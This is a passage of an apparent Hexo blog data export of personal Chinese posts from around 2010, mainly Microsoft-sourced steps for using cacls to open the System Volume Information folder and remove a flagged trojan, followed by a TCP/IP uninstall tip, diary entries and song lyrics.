根文件夹中双击“System Volume Information”文件夹以将其打开。<br /> <br /> <strong>注意</strong>：现在，Windows  XP Home Edition 的用户可以在正常模式下访问 System Volume Information 文件夹。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在使用 NTFS 文件系统的 Windows XP Home  Edition 中使用 CACLS在采用 NTFS 文件系统的 Windows XP Home Edition 中，您还可以使用 Cacls 工具。Cacls  是一个命令行工具，可用于显示或修改文件或文件夹访问控制列表 (ACL)。有关 Cacls  工具的更多信息（包括用法和开关），请在“帮助和支持中心”中搜索“cacls”。<ol> <li>单击“开始”，单击“运行”，键入 cmd，然后单击“确定”。</li> <li>请 确保您位于要访问其 System Volume Information 文件夹的分区的根文件夹中。例如，要访问 C:System Volume  Information 文件夹，请确保您位于驱动器 C 的根文件夹中（即位于“C:”提示符处）。</li> <li>键入下行内容，然后按  Enter：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; /E /G <var>username</var>:F    请确保按上面所示键入引号。此命令将具有“完全控制”权限的指定用户添加到文件夹。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li> <li>如果需要在进行故障排除后删除这些权限，请在命令提示符处键入下行内容：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; /E /R <var>username</var>    此命令将删除指定用户的所有权限。</li></ol><br />将计算机重新启动到安全模式时，下列步骤同样有效，因为当计算机在安全模式下运行时，简单文件共享会自动关闭。<ol> <li>打开“我的电脑”，右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击 “安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。</li> <li>单 击“确定”，然后再次单击“确定”。</li> <li>双击“System Volume Information”文件夹以将其打开</li></ol>http://support.microsoft.com/kb/309531/zh-cn","source":"_posts/删除-System-Volume-Information-里内容.md","raw":"title: 删除 System Volume Information 里内容\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-06-11 15:54:00\n---\n今天我的红伞报d:System Volume Information的木文件是木马。我郁闷不知道什么时候中的，但是杀不了，拒绝访问！默认权限是system，杀软无法访问，更无法删除。<br />官方介绍的方法。。反正不能系统还原，直接去掉了。。。<br /> 使用 FAT32 文件系统的 Microsoft Windows XP Professional 或  Windows XP Home Edition<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在域中使用 NTFS 文件系统的 Windows XP  Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中右键单击“System Volume  Information”文件夹，然后单击“共享和安全”。</li> <li>单击“安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予 该文件夹访问权限的用户的名称。选择相应的帐户位置（本地帐户或域帐户）。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在工作组或独立计算机上使用 NTFS 文件系统的  Windows XP Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>清除“使用简单文件共享(推荐)”复选框。</li> <li>单击“确定”。</li> <li>在 根文件夹中右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击“安全”选项卡。</li> <li>单 击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。<br /> <br /> <strong>注意</strong>：现在，Windows  XP Home Edition 的用户可以在正常模式下访问 System Volume Information 文件夹。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在使用 NTFS 文件系统的 Windows XP Home  Edition 中使用 CACLS在采用 NTFS 文件系统的 Windows XP Home Edition 中，您还可以使用 Cacls 工具。Cacls  是一个命令行工具，可用于显示或修改文件或文件夹访问控制列表 (ACL)。有关 Cacls  工具的更多信息（包括用法和开关），请在“帮助和支持中心”中搜索“cacls”。<ol> <li>单击“开始”，单击“运行”，键入 cmd，然后单击“确定”。</li> <li>请 确保您位于要访问其 System Volume Information 文件夹的分区的根文件夹中。例如，要访问 C:System Volume  Information 文件夹，请确保您位于驱动器 C 的根文件夹中（即位于“C:”提示符处）。</li> <li>键入下行内容，然后按  Enter：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; /E /G <var>username</var>:F    请确保按上面所示键入引号。此命令将具有“完全控制”权限的指定用户添加到文件夹。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li> <li>如果需要在进行故障排除后删除这些权限，请在命令提示符处键入下行内容：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; /E /R <var>username</var>    此命令将删除指定用户的所有权限。</li></ol><br />将计算机重新启动到安全模式时，下列步骤同样有效，因为当计算机在安全模式下运行时，简单文件共享会自动关闭。<ol> <li>打开“我的电脑”，右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击 “安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。</li> <li>单 击“确定”，然后再次单击“确定”。</li> <li>双击“System Volume Information”文件夹以将其打开</li></ol>http://support.microsoft.com/kb/309531/zh-cn","slug":"删除-System-Volume-Information-里内容","published":1,"updated":"2023-04-22T05:38:45.012Z","_id":"clgrjlxlj00au7opi70ar5smy","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天我的红伞报d:System Volume Information的木文件是木马。我郁闷不知道什么时候中的，但是杀不了，拒绝访问！默认权限是system，杀软无法访问，更无法删除。<br />官方介绍的方法。。反正不能系统还原，直接去掉了。。。<br /> 使用 FAT32 文件系统的 Microsoft Windows XP Professional 或  Windows XP Home Edition<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在域中使用 NTFS 文件系统的 Windows XP  Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中右键单击“System Volume  Information”文件夹，然后单击“共享和安全”。</li> <li>单击“安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予 该文件夹访问权限的用户的名称。选择相应的帐户位置（本地帐户或域帐户）。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在工作组或独立计算机上使用 NTFS 文件系统的  Windows XP Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>清除“使用简单文件共享(推荐)”复选框。</li> <li>单击“确定”。</li> <li>在 根文件夹中右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击“安全”选项卡。</li> <li>单 击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。<br /> <br /> <strong>注意</strong>：现在，Windows  XP Home Edition 的用户可以在正常模式下访问 System Volume Information 文件夹。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在使用 NTFS 文件系统的 Windows XP Home  Edition 中使用 CACLS在采用 NTFS 文件系统的 Windows XP Home Edition 中，您还可以使用 Cacls 工具。Cacls  是一个命令行工具，可用于显示或修改文件或文件夹访问控制列表 (ACL)。有关 Cacls  工具的更多信息（包括用法和开关），请在“帮助和支持中心”中搜索“cacls”。<ol> <li>单击“开始”，单击“运行”，键入 cmd，然后单击“确定”。</li> <li>请 确保您位于要访问其 System Volume Information 文件夹的分区的根文件夹中。例如，要访问 C:System Volume  Information 文件夹，请确保您位于驱动器 C 的根文件夹中（即位于“C:”提示符处）。</li> <li>键入下行内容，然后按  Enter：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; &#x2F;E &#x2F;G <var>username</var>:F    请确保按上面所示键入引号。此命令将具有“完全控制”权限的指定用户添加到文件夹。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li> <li>如果需要在进行故障排除后删除这些权限，请在命令提示符处键入下行内容：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; &#x2F;E &#x2F;R <var>username</var>    此命令将删除指定用户的所有权限。</li></ol><br />将计算机重新启动到安全模式时，下列步骤同样有效，因为当计算机在安全模式下运行时，简单文件共享会自动关闭。<ol> <li>打开“我的电脑”，右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击 “安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。</li> <li>单 击“确定”，然后再次单击“确定”。</li> <li>双击“System Volume Information”文件夹以将其打开</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn\">http://support.microsoft.com/kb/309531/zh-cn</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天我的红伞报d:System Volume Information的木文件是木马。我郁闷不知道什么时候中的，但是杀不了，拒绝访问！默认权限是system，杀软无法访问，更无法删除。<br />官方介绍的方法。。反正不能系统还原，直接去掉了。。。<br /> 使用 FAT32 文件系统的 Microsoft Windows XP Professional 或  Windows XP Home Edition<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在域中使用 NTFS 文件系统的 Windows XP  Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中右键单击“System Volume  Information”文件夹，然后单击“共享和安全”。</li> <li>单击“安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予 该文件夹访问权限的用户的名称。选择相应的帐户位置（本地帐户或域帐户）。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在工作组或独立计算机上使用 NTFS 文件系统的  Windows XP Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>清除“使用简单文件共享(推荐)”复选框。</li> <li>单击“确定”。</li> <li>在 根文件夹中右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击“安全”选项卡。</li> <li>单 击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。<br /> <br /> <strong>注意</strong>：现在，Windows  XP Home Edition 的用户可以在正常模式下访问 System Volume Information 文件夹。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在使用 NTFS 文件系统的 Windows XP Home  Edition 中使用 CACLS在采用 NTFS 文件系统的 Windows XP Home Edition 中，您还可以使用 Cacls 工具。Cacls  是一个命令行工具，可用于显示或修改文件或文件夹访问控制列表 (ACL)。有关 Cacls  工具的更多信息（包括用法和开关），请在“帮助和支持中心”中搜索“cacls”。<ol> <li>单击“开始”，单击“运行”，键入 cmd，然后单击“确定”。</li> <li>请 确保您位于要访问其 System Volume Information 文件夹的分区的根文件夹中。例如，要访问 C:System Volume  Information 文件夹，请确保您位于驱动器 C 的根文件夹中（即位于“C:”提示符处）。</li> <li>键入下行内容，然后按  Enter：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; &#x2F;E &#x2F;G <var>username</var>:F    请确保按上面所示键入引号。此命令将具有“完全控制”权限的指定用户添加到文件夹。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li> <li>如果需要在进行故障排除后删除这些权限，请在命令提示符处键入下行内容：    cacls &quot;<var>driveletter</var>:System  Volume Information&quot; &#x2F;E &#x2F;R <var>username</var>    此命令将删除指定用户的所有权限。</li></ol><br />将计算机重新启动到安全模式时，下列步骤同样有效，因为当计算机在安全模式下运行时，简单文件共享会自动关闭。<ol> <li>打开“我的电脑”，右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击 “安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。</li> <li>单 击“确定”，然后再次单击“确定”。</li> <li>双击“System Volume Information”文件夹以将其打开</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn\">http://support.microsoft.com/kb/309531/zh-cn</a></p>\n"},{"title":"卸载TCP/IP协议总结","date":"2010-03-22T10:08:00.000Z","_content":"<p>正常情况下、网卡属性里面TCP/IP协议卸载按钮是灰色的，无法卸载。</p><p> </p><p>&#160;1.找到%winroot%/inf/nettcpip.inf，用记事本打开。</p><p>[MS_TCPIP.PrimaryInstall]<br />Characteristics = 0xa0  &lt;------把此处的0Xa0改为0x80</p><p>2.网卡属性——安装——网络类型组件——协议——从磁盘安装——浏览到刚才修改的文件——Internet协议（TCP/IP)</p><p>3.现在Internet TCP/IP卸载按钮就是可选的了。</p><p>4.卸载 Internet TCP/IP，重启就卸载完成、</p><p>&#160;</p><p>安装就大同小异了，不写了。</p>","source":"_posts/卸载TCP-IP协议总结.md","raw":"title: 卸载TCP/IP协议总结\ncategories: [Windows]\ntags: []\ndate: 2010-03-22 18:08:00\n---\n<p>正常情况下、网卡属性里面TCP/IP协议卸载按钮是灰色的，无法卸载。</p><p> </p><p>&#160;1.找到%winroot%/inf/nettcpip.inf，用记事本打开。</p><p>[MS_TCPIP.PrimaryInstall]<br />Characteristics = 0xa0  &lt;------把此处的0Xa0改为0x80</p><p>2.网卡属性——安装——网络类型组件——协议——从磁盘安装——浏览到刚才修改的文件——Internet协议（TCP/IP)</p><p>3.现在Internet TCP/IP卸载按钮就是可选的了。</p><p>4.卸载 Internet TCP/IP，重启就卸载完成、</p><p>&#160;</p><p>安装就大同小异了，不写了。</p>","slug":"卸载TCP-IP协议总结","published":1,"updated":"2023-04-22T05:38:45.015Z","_id":"clgrjlxlk00aw7opifohhh0kp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>正常情况下、网卡属性里面TCP/IP协议卸载按钮是灰色的，无法卸载。</p><p> </p><p>&#160;1.找到%winroot%/inf/nettcpip.inf，用记事本打开。</p><p>[MS_TCPIP.PrimaryInstall]<br />Characteristics = 0xa0  &lt;------把此处的0Xa0改为0x80</p><p>2.网卡属性——安装——网络类型组件——协议——从磁盘安装——浏览到刚才修改的文件——Internet协议（TCP/IP)</p><p>3.现在Internet TCP/IP卸载按钮就是可选的了。</p><p>4.卸载 Internet TCP/IP，重启就卸载完成、</p><p>&#160;</p><p>安装就大同小异了，不写了。</p>","site":{"data":{}},"excerpt":"","more":"<p>正常情况下、网卡属性里面TCP/IP协议卸载按钮是灰色的，无法卸载。</p><p> </p><p>&#160;1.找到%winroot%/inf/nettcpip.inf，用记事本打开。</p><p>[MS_TCPIP.PrimaryInstall]<br />Characteristics = 0xa0  &lt;------把此处的0Xa0改为0x80</p><p>2.网卡属性——安装——网络类型组件——协议——从磁盘安装——浏览到刚才修改的文件——Internet协议（TCP/IP)</p><p>3.现在Internet TCP/IP卸载按钮就是可选的了。</p><p>4.卸载 Internet TCP/IP，重启就卸载完成、</p><p>&#160;</p><p>安装就大同小异了，不写了。</p>"},{"title":"失忆！","date":"2010-03-25T15:03:00.000Z","_content":"夜深里，人静了，自己的心平静了。<br />每当这时候，自己都好低落。<br />现在自己变的好深沉，好忧虑。<br />深沉点好，可以变的成熟些。<br />努力让自己忘记她，但发现自己好失败。<br />常常想想她过的怎么样。<br />现在她在做什么，工作还是休息还是陪男朋友。<br />看看手机有没有信息，多么希望她的出现，那怕是点施舍。<br />多想发个短息问问，最近过的好吗？<br />但是我不没有。<br />QQ习惯了隐身，当她上线的时候多想问一句，在吗？<br />但是我没有。<br />因为<br />这都是多余的，这已不属于我。<br />现在会有个更好的男人陪着她，照顾她，爱着她。<br />而自己空挡的心，有谁来填满。<br />难道注定我一生孤独，一生后悔。<br /><br />---2010年03月23日夜深<br />","source":"_posts/失忆！.md","raw":"title: 失忆！\ncategories: [生活感想]\ntags: []\ndate: 2010-03-25 23:03:00\n---\n夜深里，人静了，自己的心平静了。<br />每当这时候，自己都好低落。<br />现在自己变的好深沉，好忧虑。<br />深沉点好，可以变的成熟些。<br />努力让自己忘记她，但发现自己好失败。<br />常常想想她过的怎么样。<br />现在她在做什么，工作还是休息还是陪男朋友。<br />看看手机有没有信息，多么希望她的出现，那怕是点施舍。<br />多想发个短息问问，最近过的好吗？<br />但是我不没有。<br />QQ习惯了隐身，当她上线的时候多想问一句，在吗？<br />但是我没有。<br />因为<br />这都是多余的，这已不属于我。<br />现在会有个更好的男人陪着她，照顾她，爱着她。<br />而自己空挡的心，有谁来填满。<br />难道注定我一生孤独，一生后悔。<br /><br />---2010年03月23日夜深<br />","slug":"失忆！","published":1,"updated":"2023-04-22T05:38:45.018Z","_id":"clgrjlxlm00az7opi7ojfc2il","comments":1,"layout":"post","photos":[],"link":"","content":"<p>夜深里，人静了，自己的心平静了。<br />每当这时候，自己都好低落。<br />现在自己变的好深沉，好忧虑。<br />深沉点好，可以变的成熟些。<br />努力让自己忘记她，但发现自己好失败。<br />常常想想她过的怎么样。<br />现在她在做什么，工作还是休息还是陪男朋友。<br />看看手机有没有信息，多么希望她的出现，那怕是点施舍。<br />多想发个短息问问，最近过的好吗？<br />但是我不没有。<br />QQ习惯了隐身，当她上线的时候多想问一句，在吗？<br />但是我没有。<br />因为<br />这都是多余的，这已不属于我。<br />现在会有个更好的男人陪着她，照顾她，爱着她。<br />而自己空挡的心，有谁来填满。<br />难道注定我一生孤独，一生后悔。<br /><br />—2010年03月23日夜深<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>夜深里，人静了，自己的心平静了。<br />每当这时候，自己都好低落。<br />现在自己变的好深沉，好忧虑。<br />深沉点好，可以变的成熟些。<br />努力让自己忘记她，但发现自己好失败。<br />常常想想她过的怎么样。<br />现在她在做什么，工作还是休息还是陪男朋友。<br />看看手机有没有信息，多么希望她的出现，那怕是点施舍。<br />多想发个短息问问，最近过的好吗？<br />但是我不没有。<br />QQ习惯了隐身，当她上线的时候多想问一句，在吗？<br />但是我没有。<br />因为<br />这都是多余的，这已不属于我。<br />现在会有个更好的男人陪着她，照顾她，爱着她。<br />而自己空挡的心，有谁来填满。<br />难道注定我一生孤独，一生后悔。<br /><br />—2010年03月23日夜深<br /></p>\n"},{"title":"什么都是浮云","date":"2012-04-20T01:08:00.000Z","_content":"<p>什么vpn，什么跳板，尼玛都是浮云，谁也挡不住功夫网了，地球阻止不了他了，尼玛MAC都是浮云，SSL对ISP应该也是浮云，还让人活不。</p>","source":"_posts/什么都是浮云.md","raw":"title: 什么都是浮云\ncategories: [生活感想]\ntags: []\ndate: 2012-04-20 09:08:00\n---\n<p>什么vpn，什么跳板，尼玛都是浮云，谁也挡不住功夫网了，地球阻止不了他了，尼玛MAC都是浮云，SSL对ISP应该也是浮云，还让人活不。</p>","slug":"什么都是浮云","published":1,"updated":"2023-04-22T05:38:44.976Z","_id":"clgrjlxln00b17opihyta8r6m","comments":1,"layout":"post","photos":[],"link":"","content":"<p>什么vpn，什么跳板，尼玛都是浮云，谁也挡不住功夫网了，地球阻止不了他了，尼玛MAC都是浮云，SSL对ISP应该也是浮云，还让人活不。</p>","site":{"data":{}},"excerpt":"","more":"<p>什么vpn，什么跳板，尼玛都是浮云，谁也挡不住功夫网了，地球阻止不了他了，尼玛MAC都是浮云，SSL对ISP应该也是浮云，还让人活不。</p>"},{"title":"心情不错","date":"2010-04-29T03:31:00.000Z","_content":"最近心情不错，学了很多东西。继续努力。。。","source":"_posts/心情不错.md","raw":"title: 心情不错\ncategories: [生活感想]\ntags: []\ndate: 2010-04-29 11:31:00\n---\n最近心情不错，学了很多东西。继续努力。。。","slug":"心情不错","published":1,"updated":"2023-04-22T05:38:45.059Z","_id":"clgrjlxlo00b37opibjij5l73","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近心情不错，学了很多东西。继续努力。。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近心情不错，学了很多东西。继续努力。。。</p>\n"},{"title":"我相信[歌词]","date":"2011-01-14T05:06:00.000Z","_content":"<p>很激励人 的一首歌，让我听了心情澎湃。<embed width=\"400px\" height=\"95px\" src=\"http://box.baidu.com/widget/flash/bdspacesong.swf?&amp;url=&amp;name=我相信&amp;artist=杨培安&amp;extra=&amp;autoPlay=false&amp;loop=false\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"never\"></embed></p><p><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />想做的梦<br />从不怕别人看见<br />在这里我都能实现<br />大声欢笑让你我肩并肩<br />何处不能欢乐无限<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />我相信(我就是我)<br />我相信(自由自在)<br />我相信(我相信我相信)<br />I BELIVE<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br />oh ~~~<br />ah ~~~<br /><br /><br /><br /><br /><br /><br /><br /></p>","source":"_posts/我相信[歌词].md","raw":"title: 我相信[歌词]\ncategories: [生活感想]\ntags: []\ndate: 2011-01-14 13:06:00\n---\n<p>很激励人 的一首歌，让我听了心情澎湃。<embed width=\"400px\" height=\"95px\" src=\"http://box.baidu.com/widget/flash/bdspacesong.swf?&amp;url=&amp;name=我相信&amp;artist=杨培安&amp;extra=&amp;autoPlay=false&amp;loop=false\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"never\"></embed></p><p><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />想做的梦<br />从不怕别人看见<br />在这里我都能实现<br />大声欢笑让你我肩并肩<br />何处不能欢乐无限<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />我相信(我就是我)<br />我相信(自由自在)<br />我相信(我相信我相信)<br />I BELIVE<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br />oh ~~~<br />ah ~~~<br /><br /><br /><br /><br /><br /><br /><br /></p>","slug":"我相信[歌词]","published":1,"updated":"2023-04-22T05:38:45.070Z","_id":"clgrjlxlq00b67opi15gg5sd5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>很激励人 的一首歌，让我听了心情澎湃。<embed width=\"400px\" height=\"95px\" src=\"http://box.baidu.com/widget/flash/bdspacesong.swf?&amp;url=&amp;name=我相信&amp;artist=杨培安&amp;extra=&amp;autoPlay=false&amp;loop=false\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"never\"></embed></p><p><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />想做的梦<br />从不怕别人看见<br />在这里我都能实现<br />大声欢笑让你我肩并肩<br />何处不能欢乐无限<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />我相信(我就是我)<br />我相信(自由自在)<br />我相信(我相信我相信)<br />I BELIVE<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br />oh ~~~<br />ah ~~~<br /><br /><br /><br /><br /><br /><br /><br /></p>","site":{"data":{}},"excerpt":"","more":"<p>很激励人 的一首歌，让我听了心情澎湃。<embed width=\"400px\" height=\"95px\" src=\"http://box.baidu.com/widget/flash/bdspacesong.swf?&amp;url=&amp;name=我相信&amp;artist=杨培安&amp;extra=&amp;autoPlay=false&amp;loop=false\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"never\"></embed></p><p><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />想做的梦<br />从不怕别人看见<br />在这里我都能实现<br />大声欢笑让你我肩并肩<br />何处不能欢乐无限<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />想飞上天<br />和太阳肩并肩<br />世界等着我去改变<br />抛开烦恼<br />勇敢的大步向前<br />我就站在舞台中间<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br /><br />我相信(我就是我)<br />我相信(自由自在)<br />我相信(我相信我相信)<br />I BELIVE<br />我相信我就是我<br />我相信明天<br />我相信青春没有地平线<br />在日落的海边<br />在热闹的大街<br />都是我心中最美的乐园<br />我相信自由自在<br />我相信希望<br />我相信伸手就能碰到天<br />有你在我身边<br />让生活更新鲜<br />每一刻都精采万分<br />I do believe<br />oh ~~~<br />ah ~~~<br /><br /><br 